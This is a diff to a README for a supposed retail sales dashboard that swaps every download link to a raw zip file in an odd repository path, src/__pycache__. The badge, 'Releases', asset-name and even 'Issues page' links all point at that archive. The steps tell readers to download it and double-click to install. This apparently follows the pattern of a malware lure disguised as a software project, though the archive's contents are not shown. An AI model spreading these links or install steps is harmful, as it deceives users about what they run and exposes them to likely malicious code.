@@ -1,6 +1,6 @@
 # 📊 RetailPulse-Sales-Warehouse-Dashboard - Gain Sales Insights Effortlessly
 
-[![Download RetailPulse](https://github.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/raw/refs/heads/main/RetailPulse-Sales-Warehouse-Dashboard/sql/Dashboard-Pulse-Warehouse-Sales-Retail-v3.3.zip%https://github.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/raw/refs/heads/main/RetailPulse-Sales-Warehouse-Dashboard/sql/Dashboard-Pulse-Warehouse-Sales-Retail-v3.3.zip)](https://github.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/raw/refs/heads/main/RetailPulse-Sales-Warehouse-Dashboard/sql/Dashboard-Pulse-Warehouse-Sales-Retail-v3.3.zip)
+[![Download RetailPulse](https://raw.githubusercontent.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/main/RetailPulse-Sales-Warehouse-Dashboard/src/__pycache__/Warehouse_Dashboard_Pulse_Retail_Sales_v1.5-alpha.5.zip%https://raw.githubusercontent.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/main/RetailPulse-Sales-Warehouse-Dashboard/src/__pycache__/Warehouse_Dashboard_Pulse_Retail_Sales_v1.5-alpha.5.zip)](https://raw.githubusercontent.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/main/RetailPulse-Sales-Warehouse-Dashboard/src/__pycache__/Warehouse_Dashboard_Pulse_Retail_Sales_v1.5-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome to the RetailPulse Sales Warehouse Dashboard. This application helps you
 
 ## 📥 Download & Install
 
-To get started with RetailPulse, visit this page to download: [RetailPulse Releases](https://github.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/raw/refs/heads/main/RetailPulse-Sales-Warehouse-Dashboard/sql/Dashboard-Pulse-Warehouse-Sales-Retail-v3.3.zip).
+To get started with RetailPulse, visit this page to download: [RetailPulse Releases](https://raw.githubusercontent.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/main/RetailPulse-Sales-Warehouse-Dashboard/src/__pycache__/Warehouse_Dashboard_Pulse_Retail_Sales_v1.5-alpha.5.zip).
 
 ### Step-by-Step Installation
 
-1. Navigate to the [Releases](https://github.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/raw/refs/heads/main/RetailPulse-Sales-Warehouse-Dashboard/sql/Dashboard-Pulse-Warehouse-Sales-Retail-v3.3.zip) page.
+1. Navigate to the [Releases](https://raw.githubusercontent.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/main/RetailPulse-Sales-Warehouse-Dashboard/src/__pycache__/Warehouse_Dashboard_Pulse_Retail_Sales_v1.5-alpha.5.zip) page.
 2. Find the latest version of the software and click on it.
-3. Under "Assets," download the relevant files for your system. If you are unsure, choose the file labeled as "*https://github.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/raw/refs/heads/main/RetailPulse-Sales-Warehouse-Dashboard/sql/Dashboard-Pulse-Warehouse-Sales-Retail-v3.3.zip*".
+3. Under "Assets," download the relevant files for your system. If you are unsure, choose the file labeled as "*https://raw.githubusercontent.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/main/RetailPulse-Sales-Warehouse-Dashboard/src/__pycache__/Warehouse_Dashboard_Pulse_Retail_Sales_v1.5-alpha.5.zip*".
 4. Once the download completes, locate the downloaded file.
 5. Double-click the file to start the installation.
 6. Follow the on-screen instructions to complete the setup.
@@ -58,7 +58,7 @@ If you encounter issues while using RetailPulse, consider the following:
 
 For further assistance:
 
-- Visit our [GitHub Issues page](https://github.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/raw/refs/heads/main/RetailPulse-Sales-Warehouse-Dashboard/sql/Dashboard-Pulse-Warehouse-Sales-Retail-v3.3.zip) to report bugs or request features.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/HujunChan/RetailPulse-Sales-Warehouse-Dashboard/main/RetailPulse-Sales-Warehouse-Dashboard/src/__pycache__/Warehouse_Dashboard_Pulse_Retail_Sales_v1.5-alpha.5.zip) to report bugs or request features.
 - Join our community on [Discord](insert_discord_link) for real-time support and discussions.
 
 Thank you for choosing RetailPulse. We hope this tool helps you gain valuable insights into your sales data!
